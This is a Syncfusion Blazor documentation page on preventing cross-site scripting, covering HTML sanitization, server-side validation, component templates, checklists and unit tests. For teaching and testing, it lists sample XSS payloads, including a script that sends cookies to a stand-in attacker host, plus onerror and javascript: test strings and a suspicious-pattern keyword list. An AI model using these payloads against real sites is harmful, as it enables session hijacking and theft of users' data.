---
layout: post
title: Cross-Site Scripting (XSS) Security | Syncfusion Blazor
description: Learn how to protect your Syncfusion Blazor applications from XSS attacks with built-in sanitization, server-side validation, and component-specific security guidance.
platform: Blazor
control: Common
documentation: ug
---

# Cross-Site Scripting (XSS) Security in Blazor Applications

## Overview

Cross-Site Scripting (XSS) is one of the most common and critical web application security vulnerabilities. This guide provides comprehensive security guidance for protecting Syncfusion<sup style="font-size:70%">&reg;</sup> Blazor applications from XSS attacks, including built-in sanitization features, server-side validation strategies, and component-specific best practices.

## What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser with the same privileges as legitimate application code, potentially leading to:

- **Session hijacking** - Stealing authentication tokens or cookies
- **Data theft** - Accessing sensitive user information
- **Malware distribution** - Redirecting users to malicious sites
- **UI manipulation** - Defacing application interfaces
- **Credential harvesting** - Capturing user inputs like passwords

### Types of XSS Attacks

1. **Stored XSS** - Malicious scripts stored in databases and rendered to users (highest risk)
2. **Reflected XSS** - Malicious scripts passed through URL parameters or form inputs
3. **DOM-based XSS** - Client-side scripts manipulating the DOM with unsafe data

## Why XSS Matters in Blazor Applications

### Blazor Server vs. Blazor WebAssembly

Both Blazor hosting models present unique XSS considerations:

**Blazor Server:**
- Server-side execution provides centralized validation
- SignalR connections vulnerable to hijacking if XSS occurs
- User session state can be compromised
- Database and backend resources at risk

**Blazor WebAssembly:**
- Runs entirely in browser with full access to DOM
- API tokens and credentials stored client-side
- Limited server-side validation enforcement
- Larger client-side attack surface

### Syncfusion Component Attack Surface

Syncfusion Blazor components that accept or display user content are potential XSS vectors:

- **Rich content editors** - RichTextEditor, BlockEditor, MarkdownEditor
- **Data display** - DataGrid, ListView, TreeView with templates
- **Communication** - Chat UI, AI AssistView
- **Smart components** - Smart Paste Button, Smart TextArea
- **Dialogs and notifications** - Toast, Dialog, Message with HTML content
- **Navigation** - Menu, Toolbar, Accordion with custom HTML

## XSS Threat Model and Attack Vectors

### Common Attack Vectors

1. **User-generated content**
   - Forum posts, comments, chat messages
   - Rich text editor content
   - Profile information and bios

2. **Data from external sources**
   - Third-party API responses
   - Imported files (CSV, Excel, JSON)
   - RSS feeds and webhooks

3. **Template injections**
   - DataGrid column templates
   - ListView item templates
   - Custom rendering functions

4. **Clipboard operations**
   - Paste events in editors
   - Smart Paste features
   - Copy-paste from untrusted sources

5. **Stored malicious data**
   - Database records with unescaped HTML
   - Configuration files
   - Cached content

### Example Attack Payloads

```html
<!-- Script injection -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

<!-- Event handler injection -->
<img src="x" onerror="alert('XSS')" />

<!-- SVG-based attack -->
<svg onload="alert('XSS')">

<!-- Data attribute abuse -->
<div data-bind="innerHTML: maliciousContent"></div>

<!-- JavaScript protocol -->
<a href="javascript:void(document.cookie='stolen')">Click here</a>
```

## Defense-in-Depth Principles

Effective XSS prevention requires multiple layers of defense:

### 1. Output Encoding

Always encode user content when rendering:

```razor
@* Safe - Blazor automatically encodes text *@
<p>@userInput</p>

@* UNSAFE - Bypasses encoding *@
<p>@((MarkupString)userInput)</p>
```

### 2. Input Validation

Validate and restrict input at entry points:

```csharp
public class CommentValidator : AbstractValidator<Comment>
{
    public CommentValidator()
    {
        RuleFor(x => x.Content)
            .NotEmpty()
            .MaximumLength(5000)
            .Must(BeValidContent)
            .WithMessage("Comment contains potentially unsafe content");
    }

    private bool BeValidContent(string content)
    {
        // Reject obvious script tags
        return !content.Contains("<script", StringComparison.OrdinalIgnoreCase);
    }
}
```

### 3. HTML Sanitization

Remove or neutralize dangerous HTML elements:

```csharp
// Server-side sanitization before storing
public string SanitizeHtml(string input)
{
    var sanitizer = new HtmlSanitizer();
    sanitizer.AllowedTags.Clear();
    sanitizer.AllowedTags.Add("p");
    sanitizer.AllowedTags.Add("b");
    sanitizer.AllowedTags.Add("i");
    sanitizer.AllowedTags.Add("u");
    sanitizer.AllowedTags.Add("br");
    
    return sanitizer.Sanitize(input);
}
```

### 4. Content Security Policy (CSP)

Implement CSP headers to restrict script execution. Refer to the [Content Security Policy documentation](./content-security-policy) for Blazor-specific guidance.

## Syncfusion Built-in HTML Sanitizer

Syncfusion provides the `EnableHtmlSanitizer` property across multiple components to provide client-side XSS protection.

### How EnableHtmlSanitizer Works

When enabled (default: `true`), the sanitizer:

1. Removes `<script>` tags and their content
2. Strips event handler attributes (`onclick`, `onerror`, `onload`, etc.)
3. Removes `javascript:` protocol from links
4. Neutralizes potentially dangerous HTML elements
5. Preserves safe formatting tags (`<p>`, `<b>`, `<i>`, `<ul>`, etc.)

### Components Supporting EnableHtmlSanitizer

The following Syncfusion Blazor components support the `EnableHtmlSanitizer` property:

- **Editors:** RichTextEditor, BlockEditor, InPlaceEditor
- **Navigation:** Accordion, Menu, ContextMenu, Toolbar, Tab, TreeView
- **Data:** DataGrid, ListView, PivotTable
- **Layout:** Dialog, DashboardLayout, Splitter
- **Notifications:** Toast
- **Buttons:** Button, CheckBox, RadioButton, DropDownButton, SplitButton, ProgressButton
- **Others:** FileManager, Tooltip, Slider

### Limitations of Client-Side Sanitization

> **Important:** Client-side sanitization alone is **NOT sufficient** for security. `EnableHtmlSanitizer` provides user experience benefits and defense-in-depth, but cannot replace server-side validation.

**Why client-side sanitization is insufficient:**

1. **Bypass potential** - Attackers can disable JavaScript or modify requests
2. **No database protection** - Malicious content can still be stored
3. **API vulnerability** - Direct API calls bypass client-side checks
4. **Zero trust principle** - Never trust client-side validation

**When to use EnableHtmlSanitizer:**

- ✅ Improve user experience by catching accidental HTML
- ✅ Add an extra defense layer (defense-in-depth)
- ✅ Provide immediate feedback without server round-trip
- ❌ **NOT** as sole security mechanism
- ❌ **NOT** as replacement for server-side sanitization

## Server-Side Sanitization (Authoritative)

Server-side sanitization is the **authoritative and required** defense against XSS attacks.

### Recommended Sanitization Libraries

**HtmlSanitizer** (Recommended for .NET)

```bash
dotnet add package HtmlSanitizer
```

**Ganss.XSS** features:
- Comprehensive XSS protection
- Configurable allow/deny lists
- CSS sanitization
- Active maintenance and security updates

### Server-Side Sanitization Example

```csharp
using Ganss.Xss;

public class ContentService
{
    private readonly HtmlSanitizer _sanitizer;
    private readonly AppDbContext _context;

    public ContentService(AppDbContext context)
    {
        _context = context;
        
        // Configure sanitizer
        _sanitizer = new HtmlSanitizer();
        
        // Allow only safe tags
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedTags.UnionWith(new[] {
            "p", "br", "strong", "em", "u", "ol", "ul", "li",
            "h1", "h2", "h3", "h4", "h5", "h6",
            "blockquote", "a", "img"
        });
        
        // Allow safe attributes
        _sanitizer.AllowedAttributes.Clear();
        _sanitizer.AllowedAttributes.Add("href");
        _sanitizer.AllowedAttributes.Add("src");
        _sanitizer.AllowedAttributes.Add("alt");
        _sanitizer.AllowedAttributes.Add("title");
        
        // Restrict URL schemes
        _sanitizer.AllowedSchemes.Clear();
        _sanitizer.AllowedSchemes.Add("http");
        _sanitizer.AllowedSchemes.Add("https");
        _sanitizer.AllowedSchemes.Add("mailto");
    }

    // Sanitize before storing
    public async Task<BlogPost> CreatePostAsync(BlogPost post)
    {
        post.Title = _sanitizer.Sanitize(post.Title);
        post.Content = _sanitizer.Sanitize(post.Content);
        post.Summary = _sanitizer.Sanitize(post.Summary);
        
        _context.BlogPosts.Add(post);
        await _context.SaveChangesAsync();
        
        return post;
    }

    // Sanitize when retrieving (defense-in-depth)
    public async Task<BlogPost> GetPostAsync(int id)
    {
        var post = await _context.BlogPosts.FindAsync(id);
        if (post != null)
        {
            post.Content = _sanitizer.Sanitize(post.Content);
        }
        return post;
    }
}
```

### API Controller Example

```csharp
[ApiController]
[Route("api/[controller]")]
public class CommentsController : ControllerBase
{
    private readonly HtmlSanitizer _sanitizer;
    private readonly CommentRepository _repository;

    public CommentsController(CommentRepository repository)
    {
        _repository = repository;
        _sanitizer = new HtmlSanitizer();
        ConfigureSanitizer();
    }

    [HttpPost]
    public async Task<IActionResult> CreateComment([FromBody] CommentDto dto)
    {
        // Server-side validation
        if (string.IsNullOrWhiteSpace(dto.Content))
        {
            return BadRequest("Content is required");
        }

        // Sanitize before storing
        var comment = new Comment
        {
            Author = _sanitizer.Sanitize(dto.Author),
            Content = _sanitizer.Sanitize(dto.Content),
            CreatedAt = DateTime.UtcNow
        };

        await _repository.AddAsync(comment);
        return Ok(comment);
    }

    private void ConfigureSanitizer()
    {
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedTags.UnionWith(new[] { "p", "br", "b", "i", "u" });
    }
}
```

## Component-Specific Guidance and Examples

### RichTextEditor and BlockEditor

Rich text editors are high-risk components requiring both client and server-side protection.

**BlockEditor with EnableHtmlSanitizer:**

```razor
@using Syncfusion.Blazor.BlockEditor

<SfBlockEditor @bind-Value="@EditorContent"
               EnableHtmlSanitizer="true"
               Created="OnEditorCreated">
</SfBlockEditor>

<button @onclick="SaveContent">Save</button>

@code {
    private string EditorContent { get; set; }

    private async Task SaveContent()
    {
        // CRITICAL: Always sanitize on server before storing
        await ContentService.SaveAsync(EditorContent);
    }
}
```

**RichTextEditor example:**

```razor
@using Syncfusion.Blazor.RichTextEditor

<SfRichTextEditor @bind-Value="@ArticleContent"
                  EnableHtmlSanitizer="true">
    <RichTextEditorToolbarSettings Items="@Tools" />
</SfRichTextEditor>

@code {
    private string ArticleContent { get; set; }
    
    private List<ToolbarItemModel> Tools = new List<ToolbarItemModel>()
    {
        new ToolbarItemModel() { Command = ToolbarCommand.Bold },
        new ToolbarItemModel() { Command = ToolbarCommand.Italic },
        new ToolbarItemModel() { Command = ToolbarCommand.Underline },
        // Limit available tools to reduce risk
    };

    private async Task SaveArticle()
    {
        // Server-side sanitization required
        var sanitized = await Http.PostAsJsonAsync("api/articles/sanitize", 
            new { content = ArticleContent });
        
        if (sanitized.IsSuccessStatusCode)
        {
            var result = await sanitized.Content.ReadFromJsonAsync<SanitizedContent>();
            await StoreInDatabase(result.CleanContent);
        }
    }
}
```

### DataGrid Templates

Grid templates must render only server-sanitized content.

**UNSAFE - Direct HTML rendering:**

```razor
@* NEVER DO THIS *@
<SfGrid DataSource="@Comments">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Content)">
            <Template>
                @{
                    var comment = (context as Comment);
                    @((MarkupString)comment.Content) @* UNSAFE! *@
                }
            </Template>
        </GridColumn>
    </GridColumns>
</SfGrid>
```

**SAFE - Sanitized MarkupString:**

```razor
@using Ganss.Xss

<SfGrid DataSource="@Comments">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Author)" HeaderText="Author" Width="150"></GridColumn>
        <GridColumn HeaderText="Comment" Width="400">
            <Template>
                @{
                    var comment = (context as Comment);
                    // Render server-sanitized content
                    @((MarkupString)comment.SanitizedContent)
                }
            </Template>
        </GridColumn>
        <GridColumn Field="@nameof(Comment.CreatedAt)" HeaderText="Date" Width="150"></GridColumn>
    </GridColumns>
</SfGrid>

@code {
    private List<Comment> Comments { get; set; }
    private HtmlSanitizer sanitizer = new HtmlSanitizer();

    protected override async Task OnInitializedAsync()
    {
        // Fetch and sanitize server-side
        var rawComments = await Http.GetFromJsonAsync<List<Comment>>("api/comments");
        
        Comments = rawComments.Select(c => new Comment
        {
            Id = c.Id,
            Author = c.Author,
            Content = c.Content,
            SanitizedContent = sanitizer.Sanitize(c.Content), // Sanitize here
            CreatedAt = c.CreatedAt
        }).ToList();
    }
}

public class Comment
{
    public int Id { get; set; }
    public string Author { get; set; }
    public string Content { get; set; }
    public string SanitizedContent { get; set; } // For rendering
    public DateTime CreatedAt { get; set; }
}
```

**Alternative - Text-only rendering:**

```razor
<SfGrid DataSource="@Comments">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Content)" HeaderText="Comment">
            <Template>
                @{
                    var comment = (context as Comment);
                    @comment.Content @* Safe - Blazor auto-encodes *@
                }
            </Template>
        </GridColumn>
    </GridColumns>
</SfGrid>
```

### ListView with Custom Templates

Similar principles apply to ListView:

```razor
@using Syncfusion.Blazor.Lists

<SfListView DataSource="@Messages"
            CssClass="e-list-template"
            EnableVirtualization="true">
    <ListViewFieldSettings Text="Content" Id="Id"></ListViewFieldSettings>
    <ListViewTemplates TValue="ChatMessage">
        <Template>
            @{
                var message = (context as ChatMessage);
                <div class="message-container">
                    <div class="message-header">
                        <strong>@message.Sender</strong>
                        <span class="timestamp">@message.Timestamp.ToShortTimeString()</span>
                    </div>
                    <div class="message-body">
                        @* Only render server-sanitized content as HTML *@
                        @if (message.IsHtml)
                        {
                            @((MarkupString)message.SanitizedContent)
                        }
                        else
                        {
                            @message.Content @* Plain text - auto-encoded *@
                        }
                    </div>
                </div>
            }
        </Template>
    </ListViewTemplates>
</SfListView>

@code {
    private List<ChatMessage> Messages { get; set; }

    public class ChatMessage
    {
        public int Id { get; set; }
        public string Sender { get; set; }
        public string Content { get; set; }
        public string SanitizedContent { get; set; }
        public bool IsHtml { get; set; }
        public DateTime Timestamp { get; set; }
    }
}
```

### Chat UI and Message Components

Chat applications require special attention due to real-time user input:

```razor
@using Syncfusion.Blazor.InteractiveChat

<SfChatUI Messages="@ChatMessages"
          User="@CurrentUser"
          MessageSend="OnMessageSend">
</SfChatUI>

@code {
    private List<ChatMessage> ChatMessages = new();
    private UserModel CurrentUser = new() { ID = "user1", User = "John Doe" };
    private HtmlSanitizer sanitizer = new HtmlSanitizer();

    private async Task OnMessageSend(MessageSendEventArgs args)
    {
        // Sanitize message before adding to chat
        var sanitizedText = sanitizer.Sanitize(args.Message.Text);
        
        var message = new ChatMessage
        {
            Text = sanitizedText,
            Author = CurrentUser,
            Timestamp = DateTime.Now
        };

        // Send to server for validation and storage
        await Http.PostAsJsonAsync("api/chat/messages", message);
        
        ChatMessages.Add(message);
    }

    protected override async Task OnInitializedAsync()
    {
        // Load messages - assume already sanitized server-side
        ChatMessages = await Http.GetFromJsonAsync<List<ChatMessage>>("api/chat/messages");
    }
}
```

### Smart Components (Smart Paste, AI AssistView)

AI-powered components introduce additional risks:

**Smart Paste Button:**

```razor
@using Syncfusion.Blazor.SmartComponents

<SfSmartPasteButton Content="Smart Paste"
                     TargetSelector="#description"
                     OnPasteComplete="OnSmartPasteComplete">
</SfSmartPasteButton>

<SfTextBox @bind-Value="@Description" 
           ID="description"
           Multiline="true">
</SfTextBox>

@code {
    private string Description { get; set; }

    private async Task OnSmartPasteComplete(SmartPasteEventArgs args)
    {
        // CRITICAL: Sanitize AI-generated or pasted content
        var sanitizer = new HtmlSanitizer();
        Description = sanitizer.Sanitize(args.PastedContent);
        
        // Validate before proceeding
        if (ContainsSuspiciousContent(Description))
        {
            // Show warning or reject
            Description = string.Empty;
            await ShowWarning("Pasted content contains potentially unsafe elements");
        }
    }

    private bool ContainsSuspiciousContent(string content)
    {
        var suspicious = new[] { "<script", "javascript:", "onerror=", "onload=" };
        return suspicious.Any(s => content.Contains(s, StringComparison.OrdinalIgnoreCase));
    }
}
```

**AI AssistView:**

```razor
@using Syncfusion.Blazor.InteractiveChat

<SfAIAssistView Prompts="@PromptSuggestions"
                PromptRequest="OnPromptRequest"
                ResponseReceived="OnResponseReceived">
</SfAIAssistView>

@code {
    private async Task OnPromptRequest(AssistViewPromptRequestedEventArgs args)
    {
        // Sanitize user prompt before sending to AI
        var sanitizer = new HtmlSanitizer();
        args.Prompt = sanitizer.Sanitize(args.Prompt);
        
        // Send to secure API endpoint
        var response = await Http.PostAsJsonAsync("api/ai/prompt", new { 
            prompt = args.Prompt 
        });
        
        args.Response = await response.Content.ReadAsStringAsync();
    }

    private void OnResponseReceived(AssistViewResponseEventArgs args)
    {
        // Sanitize AI response before displaying
        var sanitizer = new HtmlSanitizer();
        args.Response = sanitizer.Sanitize(args.Response);
    }
}
```

### Toast and Dialog with HTML Content

Notification components displaying HTML must sanitize content:

```razor
@using Syncfusion.Blazor.Notifications

<SfToast @ref="ToastObj"
         EnableHtmlSanitizer="true">
    <ToastPosition X="Right" Y="Top"></ToastPosition>
</SfToast>

@code {
    private SfToast ToastObj;

    private async Task ShowNotification(string userMessage)
    {
        // Even with EnableHtmlSanitizer, sanitize server-side first
        var sanitized = await SanitizeOnServer(userMessage);
        
        await ToastObj.ShowAsync(new ToastModel
        {
            Content = sanitized,
            CssClass = "e-toast-info"
        });
    }

    private async Task<string> SanitizeOnServer(string content)
    {
        var response = await Http.PostAsJsonAsync("api/sanitize", new { content });
        return await response.Content.ReadAsStringAsync();
    }
}
```

## Security Checklist

Use this checklist to ensure comprehensive XSS protection:

### Input Validation
- [ ] Validate all user input on the server side
- [ ] Implement input length limits
- [ ] Use strong typing and data annotations
- [ ] Reject obviously malicious patterns
- [ ] Validate file uploads (type, size, content)

### Output Encoding
- [ ] Use Blazor's default text encoding (`@variable`)
- [ ] Avoid `MarkupString` unless absolutely necessary
- [ ] Encode dynamic attributes and URLs
- [ ] Use parameterized queries for database operations

### HTML Sanitization
- [ ] Enable `EnableHtmlSanitizer` on all applicable components
- [ ] Implement server-side sanitization for all HTML content
- [ ] Use an established sanitization library (HtmlSanitizer)
- [ ] Configure strict allow-lists for tags and attributes
- [ ] Sanitize before storing AND before displaying
- [ ] Re-sanitize content from external sources

### Component Security
- [ ] Review all custom templates in DataGrid, ListView
- [ ] Sanitize RichTextEditor and BlockEditor content
- [ ] Validate Chat UI and AI component inputs/outputs
- [ ] Secure Smart Paste and clipboard operations
- [ ] Sanitize Dialog, Toast, and notification content

### Architecture & Defense-in-Depth
- [ ] Implement Content Security Policy (CSP) headers
- [ ] Use HTTPS everywhere
- [ ] Enable anti-forgery tokens
- [ ] Implement authentication and authorization
- [ ] Log suspicious input patterns
- [ ] Regular security audits and penetration testing
- [ ] Keep Syncfusion packages up to date

### API Security
- [ ] Validate and sanitize in API controllers
- [ ] Use anti-forgery tokens for state-changing operations
- [ ] Implement rate limiting
- [ ] Validate content-type headers
- [ ] Return sanitized responses

## Testing for XSS Vulnerabilities

### Manual Testing

Test with common XSS payloads:

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

### Automated Testing

**Example unit test:**

```csharp
using Xunit;
using Ganss.Xss;

public class SanitizationTests
{
    private readonly HtmlSanitizer _sanitizer;

    public SanitizationTests()
    {
        _sanitizer = new HtmlSanitizer();
        _sanitizer.AllowedTags.Clear();
        _sanitizer.AllowedTags.Add("p");
        _sanitizer.AllowedTags.Add("b");
    }

    [Theory]
    [InlineData("<script>alert('XSS')</script>", "")]
    [InlineData("<img src=x onerror=alert('XSS')>", "")]
    [InlineData("<p>Safe content</p>", "<p>Safe content</p>")]
    [InlineData("<p onclick='alert()'>Text</p>", "<p>Text</p>")]
    public void Sanitizer_RemovesMaliciousContent(string input, string expected)
    {
        var result = _sanitizer.Sanitize(input);
        Assert.Equal(expected, result);
    }

    [Fact]
    public void Sanitizer_PreservesAllowedTags()
    {
        var input = "<p>This is <b>bold</b> text</p>";
        var result = _sanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitizer_RemovesDisallowedTags()
    {
        var input = "<p>Safe</p><script>alert('XSS')</script>";
        var result = _sanitizer.Sanitize(input);
        Assert.Equal("<p>Safe</p>", result);
    }
}
```

### Browser DevTools Testing

1. Open browser developer tools (F12)
2. Monitor console for CSP violations
3. Check Network tab for suspicious requests
4. Verify XSS payloads are neutralized

## Recommended Security Libraries

### .NET Server-Side

| Library | Purpose | Installation |
|---------|---------|--------------|
| [HtmlSanitizer](https://github.com/mganss/HtmlSanitizer) | HTML sanitization | `dotnet add package HtmlSanitizer` |
| [AngleSharp](https://anglesharp.github.io/) | HTML parsing and manipulation | `dotnet add package AngleSharp` |
| [FluentValidation](https://fluentvalidation.net/) | Input validation | `dotnet add package FluentValidation` |

### Client-Side (Blazor WebAssembly)

While server-side sanitization is authoritative, these can provide additional client-side defense:

| Library | Purpose | Installation |
|---------|---------|--------------|
| [DOMPurify](https://github.com/cure53/DOMPurify) | JavaScript HTML sanitization | Via JavaScript interop |
| [js-xss](https://github.com/leizongmin/js-xss) | JavaScript XSS filter | Via JavaScript interop |

### Example: HtmlSanitizer Configuration

```csharp
using Ganss.Xss;

public static class SanitizerConfiguration
{
    public static HtmlSanitizer CreateRestrictiveSanitizer()
    {
        var sanitizer = new HtmlSanitizer();
        
        // Allow only basic formatting
        sanitizer.AllowedTags.Clear();
        sanitizer.AllowedTags.UnionWith(new[] {
            "p", "br", "strong", "em", "u", "ul", "ol", "li"
        });
        
        // No attributes allowed
        sanitizer.AllowedAttributes.Clear();
        
        // No CSS
        sanitizer.AllowedCssProperties.Clear();
        
        // Only safe URI schemes
        sanitizer.AllowedSchemes.Clear();
        sanitizer.AllowedSchemes.Add("http");
        sanitizer.AllowedSchemes.Add("https");
        
        return sanitizer;
    }

    public static HtmlSanitizer CreateEditorSanitizer()
    {
        var sanitizer = new HtmlSanitizer();
        
        // Allow common editor tags
        sanitizer.AllowedTags.Clear();
        sanitizer.AllowedTags.UnionWith(new[] {
            "p", "br", "strong", "em", "u", "s", "ul", "ol", "li",
            "h1", "h2", "h3", "h4", "h5", "h6",
            "blockquote", "a", "img", "table", "thead", "tbody",
            "tr", "th", "td", "pre", "code"
        });
        
        // Allow safe attributes
        sanitizer.AllowedAttributes.Clear();
        sanitizer.AllowedAttributes.Add("href");
        sanitizer.AllowedAttributes.Add("src");
        sanitizer.AllowedAttributes.Add("alt");
        sanitizer.AllowedAttributes.Add("title");
        sanitizer.AllowedAttributes.Add("class");
        
        // Allow safe CSS
        sanitizer.AllowedCssProperties.Clear();
        sanitizer.AllowedCssProperties.UnionWith(new[] {
            "color", "background-color", "font-size", "font-weight",
            "text-align", "margin", "padding"
        });
        
        return sanitizer;
    }
}
```

## Additional Resources

### Syncfusion Documentation
- [Content Security Policy for Blazor](./content-security-policy)
- [Input Validation](./input-validation)
- [Rich Text Editor Security](../rich-text-editor/prevent-cross-site-scripting)
- [Block Editor Cross-Site Scripting Prevention](../block-editor/editor-security/cross-site-script)

### Security Best Practices
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP HTML Sanitization](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization)
- [Microsoft - Prevent Cross-Site Scripting in ASP.NET Core](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting)
- [Develop ASP.NET Core Applications Securely](https://www.syncfusion.com/blogs/post/10-practices-secure-asp-net-core-mvc-app.aspx)
- [Shield Your Applications with Content Security Policy](https://www.syncfusion.com/blogs/post/asp-dotnet-mvc-content-security-policy.aspx)

### Tools
- [OWASP ZAP](https://www.zaproxy.org/) - Security testing tool
- [Burp Suite](https://portswigger.net/burp) - Web vulnerability scanner
- [Mozilla Observatory](https://observatory.mozilla.org/) - Security assessment

## Summary

XSS protection in Syncfusion Blazor applications requires a multi-layered approach:

1. **Never trust user input** - Validate and sanitize all data from users, APIs, and external sources
2. **Enable `EnableHtmlSanitizer`** - Use Syncfusion's built-in client-side sanitization for defense-in-depth
3. **Always sanitize server-side** - Use established libraries like HtmlSanitizer for authoritative protection
4. **Use output encoding** - Let Blazor's default encoding protect you; avoid `MarkupString` when possible
5. **Implement CSP** - Add Content Security Policy headers to restrict script execution
6. **Test thoroughly** - Use both manual and automated testing with real XSS payloads
7. **Stay updated** - Keep Syncfusion packages and security libraries current

By following these guidelines and implementing defense-in-depth strategies, you can build secure Blazor applications that protect your users from XSS attacks while maintaining rich, interactive user experiences.

> **Remember:** Security is not a one-time task but an ongoing process. Regularly review your code, conduct security audits, and stay informed about emerging threats and best practices.
